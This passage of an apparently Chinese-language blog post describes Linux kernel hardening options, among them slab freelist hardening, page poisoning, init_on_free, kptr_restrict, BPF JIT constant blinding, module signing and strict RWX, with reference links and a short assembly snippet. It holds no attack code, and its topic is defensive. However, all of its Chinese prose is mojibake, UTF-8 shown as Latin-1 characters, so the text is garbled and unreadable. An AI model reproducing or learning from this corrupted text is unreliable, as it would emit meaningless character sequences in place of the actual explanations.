æˆçš„æ•°ç»„æº¢å‡ºã€‚è¿™ä¸ªç¼ºç‚¹å¯ä»¥ç”¨<code>FORTIFY_SOURCE</code>æ¥è§£å†³ã€‚</p><p>å‚è€ƒï¼š<a href="https://github.com/torvalds/linux/blob/master/lib/Kconfig.ubsan" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/lib/Kconfig.ubsan</a></p><h3 id="SLAB-FREELIST-HARDENED"><a href="#SLAB-FREELIST-HARDENED" class="headerlink" title="SLAB_FREELIST_HARDENED"></a>SLAB_FREELIST_HARDENED</h3><p>åŠ å›ºslab freelistçš„å…ƒæ•°æ®çš„é˜²å¾¡ï¼Œè®¸å¤šå†…æ ¸å †çš„æ”»å‡»éƒ½å°è¯•é’ˆå¯¹slabçš„ç¼“å­˜å…ƒæ•°æ®å’Œå…¶ä»–åŸºç¡€ç»“æ„ï¼Œè¿™ä¸ªé€‰é¡¹èƒ½ä»¥è¾ƒå°çš„ä»£ä»·åŠ å›ºå†…æ ¸slabåˆ†é…å™¨ï¼Œä½¿å¾—é€šç”¨çš„freeliståˆ©ç”¨æ–¹æ³•æ›´åŠ éš¾ä»¥ä½¿ç”¨ã€‚å…·ä½“çš„åšæ³•æ˜¯ä¿®æ”¹äº†ä¿å­˜åœ¨æ¯ä¸ªé‡Šæ”¾çš„ç©ºé—´çš„æ•°æ®, ä¹Ÿå°±æ˜¯freelisté‚£ä¸ªé“¾è¡¨ä¸å†æ˜¯ç›´æ¥å–æ•°æ®å°±èƒ½ç”¨çš„, éœ€è¦è¿›è¡Œé€†è¿ç®—æ‰èƒ½å¾—åˆ°ä¸‹ä¸€ä¸ªç©ºé—´çš„åœ°å€ï¼Œè¿ç®—è¿‡ç¨‹åœ¨freelist_ptrå‡½æ•°ä¸­ã€‚</p><p>å‚è€ƒï¼š<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2482ddecï¼Œhttps://hardenedlinux.github.io/system-security/2017/12/02/linux_kernel_4.14%E7%9A%84SLAB_FREELIST_HARDENED%E7%9A%84%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2482ddecï¼Œhttps://hardenedlinux.github.io/system-security/2017/12/02/linux_kernel_4.14%E7%9A%84SLAB_FREELIST_HARDENED%E7%9A%84%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90.html</a></p><h3 id="PAGE-POISONING"><a href="#PAGE-POISONING" class="headerlink" title="PAGE_POISONING"></a>PAGE_POISONING</h3><p>å’Œ<code>PAX_MEMORY_SANITIZE</code>ç±»ä¼¼çš„åŠŸèƒ½ï¼Œåœ¨é‡Šæ”¾çš„é¡µä¸Šåšå†…å­˜æ•°æ®æ“¦é™¤å·¥ä½œã€‚åœ¨<code>free_pages()</code>ä¹‹åå¡«å…¥ç‰¹æ®Šçš„æ•°æ®ï¼Œåœ¨åˆ†é…é¡µä¹‹å‰ä¼šéªŒè¯è¿™ä¸ªæ•°æ®ï¼Œä»¥è¾¾åˆ°é˜²å¾¡<code>use after free</code>çš„æ•ˆæœï¼Œè€Œå¡«å……çš„æ•°æ®èƒ½å‡å°‘ä¿¡æ¯æ³„éœ²ã€‚è¿™ä¸ªé€‰é¡¹å¯¹å†…æ ¸çš„æ‰§è¡Œæ•ˆç‡ä¼šæœ‰ä¸€å®šçš„å½±å“ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/PAGE_POISONING.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/PAGE_POISONING.html</a></p><h3 id="PAX-MEMORY-SANITIZE"><a href="#PAX-MEMORY-SANITIZE" class="headerlink" title="PAX_MEMORY_SANITIZE"></a>PAX_MEMORY_SANITIZE</h3><p>è¿™ä¸ªæ˜¯ä¸€ä¸ªç”¨äºå°†å·²è¢«é‡Šæ”¾çš„å†…å­˜ï¼Œè¿›è¡Œå…¨é¢çš„æ“¦é™¤çš„ç‰¹æ€§ã€‚å®ç°æ€è·¯å¾ˆç®€å•ä½†æ•ˆæœå¾ˆå¥½ï¼Œèƒ½å¤Ÿæœ‰æ•ˆé˜²å¾¡<code>use after free</code>çš„æ”»å‡»å’Œå‡å°‘éƒ¨åˆ†ä¿¡æ¯æ³„éœ²é—®é¢˜ã€‚æ•´ä¸ªæ“¦é™¤çš„è¿‡ç¨‹æ˜¯æ”¾åœ¨<code>slab</code>å¯¹è±¡é‡Šæ”¾æ—¶è¿›è¡Œï¼Œé€šè¿‡æ£€æµ‹ä¸€å¼€å§‹è®¾ç½®å¥½çš„<code>SLAB_</code>çš„æ ‡å¿—ä½æ¥ç¡®å®šæ˜¯å¦å¯¹å†…å­˜æ‰§è¡Œæ“¦é™¤ã€‚</p><p>å‚è€ƒï¼š<a href="https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/MEMORY_LEAK.md#pax_memory_sanitize" target="_blank" rel="noopener">https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/MEMORY_LEAK.md#pax_memory_sanitize</a></p><h3 id="init-on-free-init-on-alloc"><a href="#init-on-free-init-on-alloc" class="headerlink" title="init_on_free/init_on_alloc"></a>init_on_free/init_on_alloc</h3><p>è¿™ä¸¤ä¸ªé€‰é¡¹çš„ç›®æ ‡æ˜¯é˜»æ­¢ä¿¡æ¯æ³„éœ²å’Œä¾èµ–äºæœªåˆå§‹åŒ–å€¼çš„æ§åˆ¶æµæ¼æ´ã€‚å¼€å¯ä¸¤ä¸ªé€‰é¡¹ä¹‹ä¸€èƒ½ä¿è¯é¡µåˆ†é…å™¨è¿”å›çš„å†…å­˜å’ŒSL[A|U]Bæ˜¯ä¼šè¢«åˆå§‹åŒ–ä¸º0ã€‚SLOBåˆ†é…å™¨ç°åœ¨ä¸æ”¯æŒè¿™ä¸¤ä¸ªé€‰é¡¹ï¼Œå› ä¸ºå®ƒçš„kmemä»¿çœŸç¼“å­˜è®©<code>SLAB_TYPESAFE_BY_RCU</code>ç¼“å­˜çš„å¤„ç†å˜å¾—å¤æ‚ã€‚å¼€å¯<code>init_on_free</code>ä¹Ÿèƒ½ä¿è¯é¡µå’Œå †å¯¹è±¡åœ¨å®ƒä»¬é‡Šæ”¾ä¹‹åèƒ½ç«‹å³åˆå§‹åŒ–ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨æ‚¬æŒ‚æŒ‡é’ˆè®¿é—®åŸå§‹æ•°æ®ã€‚</p><p>å‚è€ƒï¼š<a href="https://lwn.net/Articles/791380/" target="_blank" rel="noopener">https://lwn.net/Articles/791380/</a></p><h3 id="X86-X86-INTEL-UMIP"><a href="#X86-X86-INTEL-UMIP" class="headerlink" title="X86: X86_INTEL_UMIP"></a>X86: X86_INTEL_UMIP</h3><p>ç”¨äºintelçš„ç”¨æˆ·æ¨¡å¼æŒ‡ä»¤é˜²æŠ¤ï¼ˆUser Mode Instruction Preventionï¼ŒUMIPï¼‰ï¼ŒUMIPæ˜¯ä¸€ä¸ªintelæ–°CPUæ¨å‡ºçš„å®‰å…¨ç‰¹æ€§ã€‚å¦‚æœå¼€å¯ï¼Œåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ‰§è¡Œäº†<code>SGDT</code>ï¼Œ<code>SLDT</code>ï¼Œ<code>SIDT</code>ï¼Œ<code>SMSW</code>ï¼Œ<code>STR</code>æŒ‡ä»¤å°±ä¼šå‡ºç°æŠ¥é”™ï¼Œè¿™äº›æŒ‡ä»¤ä¼šæ³„éœ²ç¡¬ä»¶çŠ¶æ€ä¿¡æ¯ã€‚è¿™äº›æŒ‡ä»¤å¾ˆå°‘ä¼šæœ‰ç¨‹åºä½¿ç”¨ï¼Œå¤§å¤šåªä¼šå‡ºç°åœ¨è½¯ä»¶ä»¿çœŸä¸Šã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/X86_INTEL_UMIP.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/X86_INTEL_UMIP.html</a></p><h3 id="kptr-restrict"><a href="#kptr-restrict" class="headerlink" title="kptr_restrict"></a>kptr_restrict</h3><p>å†…æ ¸æä¾›çš„æ§åˆ¶å˜é‡<code>/proc/sys/kernel/kptr_restrict</code>å¯ä»¥ç”¨æ¥æ§åˆ¶å†…æ ¸çš„ä¸€äº›ä¿¡æ¯è¾“å‡ºã€‚é»˜è®¤æƒ…å†µå€¼ä¸º0ï¼Œrootå’Œæ™®é€šç”¨æˆ·éƒ½èƒ½è¯»å–å†…æ ¸åœ°å€ï¼Œå€¼ä¸º1æ—¶åªæœ‰rootç”¨æˆ·æœ‰æƒé™è·å–ï¼Œå€¼ä¸º2æ—¶æ‰€æœ‰ç”¨æˆ·éƒ½æ²¡æœ‰æƒé™è·å¾—ã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/gatieme/article/details/78311841" target="_blank" rel="noopener">https://blog.csdn.net/gatieme/article/details/78311841</a></p><h3 id="GRKERNSEC-HIDESYM"><a href="#GRKERNSEC-HIDESYM" class="headerlink" title="GRKERNSEC_HIDESYM"></a>GRKERNSEC_HIDESYM</h3><p>éšè—å†…æ ¸ç¬¦å·çš„é…ç½®é€‰é¡¹ï¼Œå¦‚æœå¼€å¯é€‰é¡¹ï¼Œè·å–åŠ è½½æ¨¡å—çš„ä¿¡æ¯å’Œé€šè¿‡ç³»ç»Ÿè°ƒç”¨æ˜¾ç¤ºæ‰€æœ‰å†…æ ¸ç¬¦å·çš„æ“ä½œéƒ½ä¼šè¢«<code>CAP_SYS_MODULE</code>é™åˆ¶ã€‚è€Œä¸ºäº†å…¼å®¹æ€§ï¼Œ<code>/proc/kallsyms</code>èƒ½é™åˆ¶rootç”¨æˆ·ã€‚</p><p>å‚è€ƒï¼š<a href="https://xorl.wordpress.com/2010/11/20/grkernsec_hidesym-hide-kernel-symbols/" target="_blank" rel="noopener">https://xorl.wordpress.com/2010/11/20/grkernsec_hidesym-hide-kernel-symbols/</a></p><h3 id="SECURITY-DMESG-RESTRICT"><a href="#SECURITY-DMESG-RESTRICT" class="headerlink" title="SECURITY_DMESG_RESTRICT"></a>SECURITY_DMESG_RESTRICT</h3><p>ç”¨æ¥é™åˆ¶æœªæˆæƒè®¿é—®å†…æ ¸syslogï¼Œå†…æ ¸syslogåŒ…å«ç€å¯¹æ¼æ´åˆ©ç”¨éå¸¸æœ‰æ•ˆçš„è°ƒè¯•ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼šå†…æ ¸å †åœ°å€ã€‚è¿™ä¸ªæ–¹æ¡ˆæ¯”æ¸…é™¤æ•°ç™¾ä¸Šåƒçš„è°ƒè¯•ä¿¡æ¯æ›´å¥½ï¼Œè€Œä¸”ä¸ä¼šç ´åè¿™äº›é‡è¦çš„è°ƒè¯•ä¿¡æ¯ã€‚å¼€å¯é€‰é¡¹ä¹‹ååªæœ‰<code>CAP_SYS_ADMIN</code>èƒ½å¤Ÿè¯»å–å†…æ ¸syslogã€‚ç±»ä¼¼çš„è¿˜æœ‰<code>GRKERNSEC_DMESG</code>ã€‚</p><p>å‚è€ƒï¼š<a href="https://lwn.net/Articles/414813/" target="_blank" rel="noopener">https://lwn.net/Articles/414813/</a></p><h3 id="INIT-STACK-ALL-ZERO"><a href="#INIT-STACK-ALL-ZERO" class="headerlink" title="INIT_STACK_ALL_ZERO"></a>INIT_STACK_ALL_ZERO</h3><p>è¿™ä¸ªé€‰é¡¹å¼€å¯ä¹‹åä¼šæŠŠæ–°åˆ†é…çš„æ ˆä¸Šçš„æ‰€æœ‰æ•°æ®éƒ½åˆå§‹åŒ–ä¸º0ï¼Œè¿™æ ·å°±æ¶ˆé™¤äº†æ‰€æœ‰çš„æœªåˆå§‹åŒ–æ ˆå˜é‡çš„æ¼æ´åˆ©ç”¨ä»¥åŠä¿¡æ¯æ³„éœ²ã€‚åˆå§‹åŒ–ä¸º0èƒ½è®©å­—ç¬¦ä¸²ï¼ŒæŒ‡é’ˆï¼Œç´¢å¼•ç­‰æ›´å®‰å…¨ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/INIT_STACK_ALL_ZERO.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/INIT_STACK_ALL_ZERO.html</a></p><h3 id="STRUCTLEAK-BYREF-ALL"><a href="#STRUCTLEAK-BYREF-ALL" class="headerlink" title="STRUCTLEAK_BYREF_ALL"></a>STRUCTLEAK_BYREF_ALL</h3><p>å’Œ<code>PAX_MEMORY_STRUCTLEAK</code>ç±»ä¼¼ï¼Œåªåˆå§‹åŒ–é‚£äº›åœ¨æ ˆä¸Šè¢«ä¼ è¾“å¼•ç”¨çš„å˜é‡ï¼Œè€Œå‰©ä¸‹çš„æ²¡è¢«ä¼ è¾“å‡ºå»çš„å˜é‡ä¸åšåˆå§‹åŒ–æ“ä½œã€‚</p><p>å‚è€ƒï¼š<a href="https://www.openwall.com/lists/kernel-hardening/2019/03/11/2" target="_blank" rel="noopener">https://www.openwall.com/lists/kernel-hardening/2019/03/11/2</a></p><h3 id="PAX-MEMORY-STRUCTLEAK"><a href="#PAX-MEMORY-STRUCTLEAK" class="headerlink" title="PAX_MEMORY_STRUCTLEAK"></a>PAX_MEMORY_STRUCTLEAK</h3><p>å¼€å¯é€‰é¡¹åï¼Œå†…æ ¸ä¼šå¯¹ä¹‹åè¦å¤åˆ¶åˆ°ç”¨æˆ·æ€çš„å±€éƒ¨å˜é‡åˆå§‹åŒ–ä¸º0ï¼Œè¿™æ ·åšåŒæ ·æ˜¯é˜²æ­¢æœªåˆå§‹åŒ–çš„å˜é‡æ³„éœ²ä¿¡æ¯ã€‚å®ƒçš„ä»£ä»·ç›¸æ¯”<code>PAX_MEMORY_STACKLEAK</code>æ›´å°ï¼Œè€Œè¦†ç›–çš„èŒƒå›´ä¹Ÿç›¸å¯¹æ›´å°ã€‚</p><p>å‚è€ƒï¼š<a href="https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options" target="_blank" rel="noopener">https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options</a></p><h3 id="bpf-jit-harden"><a href="#bpf-jit-harden" class="headerlink" title="bpf_jit_harden"></a>bpf_jit_harden</h3><p>å¼€å¯é€‰é¡¹ä¹‹åèƒ½åŠ å›ºBPF JITç¼–è¯‘å™¨ï¼Œèƒ½å¤Ÿæ”¯æŒeBPF JITåç«¯ã€‚å¯ç”¨åä¼šç‰ºç‰²éƒ¨åˆ†æ€§èƒ½ï¼Œä½†èƒ½å‡å°‘JITå–·å°„æ”»å‡»ã€‚ä¸€å…±æœ‰ä¸‰ä¸ªé€‰é¡¹ï¼Œ0è¡¨ç¤ºå…³é—­ï¼Œ1è¡¨ç¤ºé’ˆå¯¹éç‰¹æƒç”¨æˆ·ä¼šåšåŠ å›ºï¼Œ2è¡¨ç¤ºé’ˆå¯¹æ‰€æœ‰ç”¨æˆ·éƒ½ä¼šåšåŠ å›ºã€‚è¿™ä¸ªåŠ å›ºçš„å®ç°æ–¹æ³•æ˜¯æŠŠJITç”Ÿæˆçš„ç«‹å³æ•°å…¨éƒ¨åšæ‹†åˆ†ï¼Œç”Ÿæˆä¸€ä¸ªéšæœºæ•°ä¸åŸæ¥çš„ç«‹å³æ•°åšå¼‚æˆ–å¾—åˆ°ä¸€ä¸ªå€¼ï¼Œéšååœ¨ä½¿ç”¨ä¹‹å‰å†é€šè¿‡å¼‚æˆ–æ¥è¿˜åŸåŸå§‹ç«‹å³æ•°ã€‚è¿™æ ·æ”»å‡»è€…æƒ³åˆ©ç”¨çš„ç«‹å³æ•°å°±ä¼šæ‹†è§£ï¼Œå¯¼è‡´JITå–·å°„å¤±è´¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov    $0xa8909090,%eax</span><br><span class="line">=&gt;</span><br><span class="line">mov    $0xe1192563,%r10d</span><br><span class="line">xor    $0x4989b5f3,%r10d</span><br><span class="line">mov    %r10d,%eax</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://www.kernel.org/doc/Documentation/sysctl/net.txtï¼Œhttps://arthurchiao.art/blog/cilium-bpf-xdp-reference-guide-zh/" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/sysctl/net.txtï¼Œhttps://arthurchiao.art/blog/cilium-bpf-xdp-reference-guide-zh/</a></p><h3 id="GRKERNSEC-JIT-HARDEN"><a href="#GRKERNSEC-JIT-HARDEN" class="headerlink" title="GRKERNSEC_JIT_HARDEN"></a>GRKERNSEC_JIT_HARDEN</h3><p>å¦‚æœå¼€å¯é€‰é¡¹ï¼Œåˆ™å°†å¯¹å†…æ ¸çš„BPF JITå¼•æ“ç”Ÿæˆçš„ä»£ç åšåŠ å›ºï¼Œç”¨æ¥é˜²æ­¢JITå–·å°„æ”»å‡»ã€‚JITå–·å°„ä¼šå°†å¯¹æ”»å‡»è€…æœ‰ç”¨çš„æŒ‡ä»¤æ”¾å…¥JITç”Ÿæˆçš„32ä½ç«‹å³æ•°å­—æ®µä¸­ï¼Œé€šè¿‡è·³è½¬è¿›ç”ŸæˆæŒ‡ä»¤çš„ä¸­é—´éƒ¨åˆ†æ¥æ‰§è¡Œæ”»å‡»è€…æ„é€ çš„æŒ‡ä»¤åºåˆ—ã€‚è€Œè¿™ä¸ªé€‰é¡¹å¯ä»¥æŠŠJITäº§ç”Ÿçš„32ä½ç«‹å³æ•°åšæ‹†åˆ†ä»¥æ­¤æ¥é˜²å¾¡æ”»å‡»ã€‚</p><p>å‚è€ƒï¼š<a href="https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options" target="_blank" rel="noopener">https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options</a></p><h3 id="MODULE-SIG"><a href="#MODULE-SIG" class="headerlink" title="MODULE_SIG*"></a>MODULE_SIG*</h3><p>ä¸€ä¸ªæ£€æŸ¥æ¨¡å—ç­¾åçš„é€‰é¡¹ï¼Œå†…æ ¸æä¾›äº†<code>SHA1</code>ï¼Œ<code>SHA224</code>ï¼Œ<code>SHA256</code>ï¼Œ<code>SHA384</code>ï¼Œ<code>SHA512</code>äº”ç§hashç®—æ³•ã€‚éœ€è¦æ³¨æ„çš„æ˜¯åœ¨ç­¾åå®Œæˆä¹‹åä¸è¦åšå»é™¤ç¬¦å·è¡¨ç­‰ä¿®æ”¹æ“ä½œã€‚</p><p>å‚è€ƒï¼š<a href="https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/module-signing.rst" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/module-signing.rst</a></p><h3 id="SECURITY-LOADPIN"><a href="#SECURITY-LOADPIN" class="headerlink" title="SECURITY_LOADPIN"></a>SECURITY_LOADPIN</h3><p>LoadPinæ˜¯ä¸€ä¸ªç”¨æ¥ç¡®ä¿æ‰€æœ‰å†…æ ¸åŠ è½½çš„æ–‡ä»¶éƒ½æ˜¯æ²¡æœ‰è¢«ç¯¡æ”¹çš„Linuxå®‰å…¨æ¨¡å—ï¼Œæ•´ä½“çš„å®ç°æ–¹æ³•æ˜¯åˆ©ç”¨æ–°çš„å†…æ ¸æ–‡ä»¶åŠ è½½æœºåˆ¶å»ä¸­æ–­æ‰€æœ‰å°è¯•åŠ è½½è¿›å†…æ ¸çš„æ–‡ä»¶ï¼ŒåŒ…æ‹¬åŠ è½½å†…æ ¸æ¨¡å—ï¼Œè¯»å–å›ºä»¶ï¼ŒåŠ è½½é•œåƒç­‰ç­‰ï¼Œç„¶åä¼šæŠŠéœ€è¦åŠ è½½çš„æ–‡ä»¶ä¸å¯åŠ¨ä¹‹åç¬¬ä¸€æ¬¡åŠ è½½ä½¿ç”¨çš„æ–‡ä»¶ä½œæ¯”è¾ƒï¼Œå¦‚æœæ²¡æœ‰åŒ¹é…ï¼Œé‚£ä¹ˆè¿™æ¬¡çš„åŠ è½½æ“ä½œä¼šè¢«é˜»æ­¢ã€‚</p><p>å‚è€ƒï¼š<a href="https://lwn.net/Articles/682302/" target="_blank" rel="noopener">https://lwn.net/Articles/682302/</a></p><h3 id="LDISC-AUTOLOAD-is-not-set"><a href="#LDISC-AUTOLOAD-is-not-set" class="headerlink" title="LDISC_AUTOLOAD is not set"></a>LDISC_AUTOLOAD is not set</h3><p>è¿™ä¸ªæ˜¯ä¸€ä¸ªæ§åˆ¶è‡ªåŠ¨åŠ è½½TTYè¡Œè§„ç¨‹çš„é€‰é¡¹ï¼Œåœ¨å†å²ä¸Šå½“æœ‰ç”¨æˆ·è¦ä½¿ç”¨<code>TIOCSETD ioctl</code>æˆ–è€…å…¶ä»–æ–¹æ³•åŠ è½½å†…æ ¸æ¨¡å—æ—¶ï¼Œå†…æ ¸æ€»æ˜¯ä¼šè‡ªåŠ¨åŠ è½½å†…æ ¸æ¨¡å—ä¸­çš„ä»»ä½•è¡Œè§„ç¨‹ã€‚å¦‚æœä½ ä¹‹åä¸ä¼šä½¿ç”¨ä¸€äº›å¤è€çš„è¡Œè§„ç¨‹ï¼Œæœ€å¥½æ˜¯æŠŠè‡ªåŠ¨åŠ è½½é€‰é¡¹å…³é—­æˆ–è€…è®¾ç½®<code>CAP_SYS_MODULE</code>æƒé™æ¥é™åˆ¶ä¸€èˆ¬ç”¨æˆ·ã€‚åœ¨ç³»ç»Ÿè¿è¡Œæ—¶è¿˜å¯ä»¥è®¾ç½®<code>dev.tty.ldisc_autoload</code>çš„å€¼æ¥æ”¹å˜é€‰é¡¹ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/LDISC_AUTOLOAD.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/LDISC_AUTOLOAD.html</a></p><h3 id="GRKERNSEC-MODHARDEN"><a href="#GRKERNSEC-MODHARDEN" class="headerlink" title="GRKERNSEC_MODHARDEN"></a>GRKERNSEC_MODHARDEN</h3><p>è¿™æ˜¯ä¸€ä¸ªåŠ å›ºæ¨¡å—è‡ªåŠ¨åŠ è½½çš„é€‰é¡¹ï¼Œå¼€å¯ä¹‹åä¼šé™åˆ¶éç‰¹æƒç”¨æˆ·ä½¿ç”¨æ¨¡å—è‡ªåŠ¨åŠ è½½åŠŸèƒ½ï¼Œä¸»è¦ç›®çš„æ˜¯ä¿æŠ¤å†…æ ¸ä¸è¦è‡ªåŠ¨åŠ è½½ä¸€äº›å®¹æ˜“å—æ”»å‡»çš„æ¨¡å—ã€‚</p><p>å‚è€ƒï¼š<a href="https://xorl.wordpress.com/2010/11/08/grsecuritys-grkernsec_modharden-protection-and-the-rds-local-root-exploit/" target="_blank" rel="noopener">https://xorl.wordpress.com/2010/11/08/grsecuritys-grkernsec_modharden-protection-and-the-rds-local-root-exploit/</a></p><h3 id="DEBUG-WX"><a href="#DEBUG-WX" class="headerlink" title="DEBUG_WX"></a>DEBUG_WX</h3><p>åœ¨å¯åŠ¨çš„æ—¶å€™å¯¹<code>W+X</code>æ‰§è¡Œæƒé™çš„æ˜ å°„åŒºåŸŸäº§ç”Ÿè­¦å‘Šï¼Œè¿™ä¸ªé€‰é¡¹çš„å¼€å¯èƒ½å¤Ÿæœ‰æ•ˆçš„å‘ç°å†…æ ¸åœ¨åº”ç”¨<code>NX</code>ä¹‹åé—ç•™çš„<code>W+X</code>æ˜ å°„åŒºåŸŸï¼Œè€Œè¿™äº›æ˜ å°„éƒ½æ˜¯é«˜é£é™©çš„åˆ©ç”¨åŒºåŸŸã€‚éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªé€‰é¡¹åªä¼šåœ¨å†…æ ¸å¯åŠ¨æ—¶æ£€æŸ¥ä¸€æ¬¡ï¼Œä¸ä¼šåœ¨å¯åŠ¨ä¹‹åå†æ¬¡æ£€æŸ¥ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/DEBUG_WX.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/DEBUG_WX.html</a></p><h3 id="ARM-RODATA-FULL-DEFAULT-ENABLED"><a href="#ARM-RODATA-FULL-DEFAULT-ENABLED" class="headerlink" title="ARM: RODATA_FULL_DEFAULT_ENABLED"></a>ARM: RODATA_FULL_DEFAULT_ENABLED</h3><p>è¿™æ˜¯ARMç‰ˆLinuxå†…æ ¸ä¸­çš„ä¸€ä¸ªé€‰é¡¹ï¼Œå¼€å¯ä¹‹åä¼šæŠŠåªè¯»çš„å±æ€§åº”ç”¨åˆ°è™šæ‹Ÿå†…å­˜çš„å…¶ä»–çº¿æ€§åˆ«åä¸Šï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢ä»£ç æ®µæˆ–ä¸€äº›åªè¯»æ•°æ®é€šè¿‡å…¶ä»–çš„å†…å­˜æ˜ å°„é¡µè¢«ä¿®æ”¹ã€‚è¿™ä¸ªé¢å¤–çš„åŠ å›ºèƒ½å¤Ÿåœ¨è¿è¡Œæ—¶ä¼ è¾“<code>rodata=off</code>å…³é—­é€‰é¡¹ã€‚å¦‚æœæƒ³è¦åœ¨é€‰é¡¹å¼€å¯æ—¶å¯¹åªè¯»åŒºåŸŸåšä¿®æ”¹ï¼Œå¯ä»¥ä¸´æ—¶è®¾ç½®ä¸€ä¸ªæ–°çš„å¯å†™å†…å­˜æ˜ å°„ï¼Œåšå‡ºä¿®æ”¹ä¹‹åå†å–æ¶ˆæ˜ å°„å®Œæˆæ›´æ–°ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/RODATA_FULL_DEFAULT_ENABLED.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/RODATA_FULL_DEFAULT_ENABLED.html</a></p><h3 id="STRICT-KERNEL-MODULE-RWX"><a href="#STRICT-KERNEL-MODULE-RWX" class="headerlink" title="STRICT_{KERNEL,MODULE}_RWX"></a>STRICT_{KERNEL,MODULE}_RWX</h3><p>ä¸€å…±ä¸¤ä¸ªé€‰é¡¹ï¼Œä¸€ä¸ªæ˜¯<code>STRICT_KERNEL_RWX</code>ï¼Œå¼€å¯é€‰é¡¹ä¹‹åï¼Œå†…æ ¸çš„<code>text</code>æ®µå’Œ<code>rodata</code>æ®µå†…å­˜å°†ä¼šå˜æˆåªè¯»ï¼Œå¹¶ä¸”éä»£ç æ®µçš„å†…å­˜å°†ä¼šå˜æˆä¸å¯æ‰§è¡Œã€‚è¿™ä¸ªä¿æŠ¤é˜²å¾¡äº†å †æ ˆæ‰§è¡Œå’Œä»£ç æ®µè¢«ä¿®æ”¹çš„æ”»å‡»ã€‚å¦å¤–ä¸€ä¸ª<code>STRICT_MODULE_RWX</code>ï¼Œä¸»è¦ç›®çš„æ˜¯è®¾ç½®åŠ è½½çš„å†…æ ¸æ¨¡å—æ•°æ®æ®µä¸å¯æ‰§è¡Œå’Œä»£ç æ®µåªè¯»ï¼ŒåŸºæœ¬æƒ…å†µå’Œ<code>STRICT_KERNEL_RWX</code>ä¸€æ ·ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/STRICT_KERNEL_RWX.htmlï¼Œhttps://cateee.net/lkddb/web-lkddb/STRICT_MODULE_RWX.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/STRICT_KERNEL_RWX.htmlï¼Œhttps://cateee.net/lkddb/web-lkddb/STRICT_MODULE_RWX.html</a></p><h3 id="PAX-KERNEXEC"><a href="#PAX-KERNEXEC" class="headerlink" title="PAX_KERNEXEC"></a>PAX_KERNEXEC</h3><p><code>PAX_KERNEXEC</code> æ˜¯ PaX é’ˆå¯¹å†…æ ¸çš„ No-execute å®ç°ï¼Œå¯ä»¥è¯´æ˜¯å†…æ ¸ç©ºé—´ç‰ˆçš„ pageexec/mprotectã€‚ç”±äº PAGEEXEC çš„å®ç°å·²ç»å®Œæˆäº†ä¸€éƒ¨åˆ†å·¥ä½œï¼ˆå®é™…ä¸Šå†…æ ¸çš„å†…å­˜è®¿é—®åŒæ ·ä¹Ÿæ˜¯é€è¿‡ page-fault å»å¤„ç†ï¼‰ï¼Œ<code>KERNEXEC</code>é€‰é¡¹çš„ä»£ç å®ç°ä¸»è¦åŒ…æ‹¬è¿™å‡ æ–¹é¢ï¼š</p><ul><li>å¯¹å†…æ ¸ç©ºé—´çš„å†…å­˜å±æ€§è¿›è¡Œè®¾ç½®ï¼ˆRO &amp; NXï¼‰</li><li>å†…æ ¸æ€çš„å†…å­˜è®¿é—®çš„æ§åˆ¶</li><li>å¯åŠ è½½å†…æ ¸æ¨¡å—ï¼ˆW^Xï¼‰å’Œ bios/efi å†…å­˜å±æ€§çš„æ§åˆ¶</li><li>é€è¿‡ gcc-plugin çš„é…åˆå®ç°</li></ul><p>å‚è€ƒï¼š<a href="https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PAX_KERNEXEC.md" target="_blank" rel="noopener">https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PAX_KERNEXEC.md</a></p><h3 id="STACKPROTECTOR"><a href="#STACKPROTECTOR" class="headerlink" title="STACKPROTECTOR"></a>STACKPROTECTOR</h3><p>æ£€æŸ¥æ 